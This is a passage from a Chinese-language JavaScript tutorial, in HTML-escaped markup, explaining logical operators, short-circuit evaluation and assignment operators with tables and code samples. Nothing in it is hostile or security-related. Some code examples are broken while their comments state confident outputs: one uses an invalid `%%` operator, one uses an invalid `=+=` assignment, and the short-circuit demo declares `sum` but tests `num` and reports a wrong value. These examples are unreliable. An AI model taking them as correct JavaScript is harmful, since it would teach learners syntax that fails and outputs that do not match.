&lt;td&gt;判断两边值是否相等（注意此时有隐式转换）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;===&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;全等&lt;/td&gt;
&lt;td&gt;判断两边的值和数据类型是否完全相同&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;55-逻辑运算符&#34;&gt;5.5 逻辑运算符&lt;/h2&gt;
&lt;h3 id=&#34;551-逻辑运算符概述&#34;&gt;5.5.1 逻辑运算符概述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念：逻辑运算符是用来进行布尔值运算的运算符，其返回值也是布尔值。后面开发中经常用于多个条件的判断。&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;逻辑运算符&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;案例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;“逻辑与”，简称“与” and&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true &amp;amp;&amp;amp; false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;||&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;“逻辑或”，简称“或” or&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true || false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;!&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;“逻辑非”，简称“非” not&lt;/td&gt;
&lt;td&gt;&lt;code&gt;!true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;552-逻辑与-&#34;&gt;5.5.2 逻辑与 &amp;amp;&amp;amp;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;两边都是&lt;code&gt;true&lt;/code&gt;才返回&lt;code&gt;true&lt;/code&gt;，否则返回&lt;code&gt;false&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200507173443.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;553-逻辑或-&#34;&gt;5.5.3 逻辑或 ||&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;两边都为&lt;code&gt;false&lt;/code&gt;，才返回&lt;code&gt;false&lt;/code&gt;，否则都为&lt;code&gt;true&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200507173718.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;554--逻辑非-&#34;&gt;5.5.4  逻辑非 !&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;逻辑非（!）也叫做取反符，用来取一个布尔值相反的值，如&lt;code&gt;true&lt;/code&gt;的相反值是&lt;code&gt;false&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isOk&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 逻辑与 &amp;amp;&amp;amp; and 两侧都为 true，结果才是 true，只要有一侧为false，结果就为false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 逻辑或 || or 两侧都为false，结果才是false，只要有一侧为true，结果就是true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 逻辑非 not
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;555-逻辑运算符练习&#34;&gt;5.5.5 逻辑运算符练习&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;我爱你~中国~&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;));	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;));	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;556-短路运算逻辑中断&#34;&gt;5.5.6 短路运算（逻辑中断）&lt;/h3&gt;
&lt;p&gt;**短路运算的原理：**当有多个表达式（值）时，左边的表达式值可以确定结果时，就不再继续运算右边的表达式的值。&lt;/p&gt;
&lt;h4 id=&#34;5561-逻辑与&#34;&gt;5.5.6.1 逻辑与&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;语法：表达式1 &amp;amp;&amp;amp; 表达式2&lt;/li&gt;
&lt;li&gt;如果第一个表达式的值为真，则返回表达式2&lt;/li&gt;
&lt;li&gt;如果第一个表达式的值为假，则返回表达式1&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;5562-逻辑或&#34;&gt;5.5.6.2 逻辑或&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;语法：表达式1 || 表达式2&lt;/li&gt;
&lt;li&gt;如果第一个表达式的值为真，则返回表达式1&lt;/li&gt;
&lt;li&gt;如果第一个表达式的值为假，则返回表达式2&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 用我们的布尔值参与的逻辑运算 true &amp;amp;&amp;amp; false == false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 123 &amp;amp;&amp;amp; 456 是值 或者是 表达式 参与逻辑运算？
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 逻辑与短路运算，如果表达式1结果为真，则返回表达式2，如果表达式1为假，则返回表达式1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 456
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56789&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56789&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 如果有空的或者否定的为假，其余是真的 0 &amp;#39;&amp;#39; null undefined NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 逻辑或短路运算，如果表达式1结果为真，则返回表达式1，如果表达式1为假，则返回表达式2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 123
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 123
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;456&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 456
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 逻辑中断很重要，它会影响我们程序的运行结果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 结果为123
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;);				&lt;span style=&#34;color:#75715e&#34;&gt;// 结果为0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;56-赋值运算符&#34;&gt;5.6 赋值运算符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;概念：用来把数据赋值给变量的运算符&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;赋值运算符&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;案例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;直接赋值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;var usrName = &#39;我是值&#39;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;+=&lt;/code&gt;、&lt;code&gt;-=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;加、减 一个数 后再赋值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;var age = 10; age += 5;&lt;/code&gt; // 15&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;*=&lt;/code&gt;、&lt;code&gt;/=&lt;/code&gt;、&lt;code&gt;%=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;乘、除、取模 后再赋值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;var age = 2; age *= 5;&lt;/code&gt; // 10&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 相当于 age = age + 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 相当于 age = age - 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 相当于 age = age * 10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// num = num + 1;	num++
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// num = num + 2;	// num += 2;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 6
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
